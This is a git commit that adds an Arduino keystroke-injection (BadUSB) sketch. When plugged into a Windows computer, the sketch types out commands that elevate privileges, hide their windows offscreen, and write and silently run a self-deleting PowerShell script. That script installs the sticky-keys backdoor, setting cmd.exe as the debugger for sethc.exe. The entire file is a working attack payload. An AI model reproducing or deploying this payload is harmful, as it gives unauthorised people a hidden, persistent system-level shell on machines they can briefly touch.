d539c9b765d4e35ab8d70399c02a23a18932f8d7
Ubaidullah Nagoo <ubaid.cst@gmail.com>
2020-10-21 16:20:37 +0530

    Add files via upload

---
+++ cmd_propmt.ino
@@ -0,0 +1,141 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(750);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("powershell Start-Process notepad -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(750);
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("m");
+
+  delay(1000);
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Remove-Item $MyINvocation.InvocationName");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("C:\\Windows\\config-99018.ps1");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(750);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(750);
+
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("mode con:cols=14 lines=1");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(750);
+
+  Keyboard.print("m");
+
+  delay(750);
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-99018.ps1");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
+
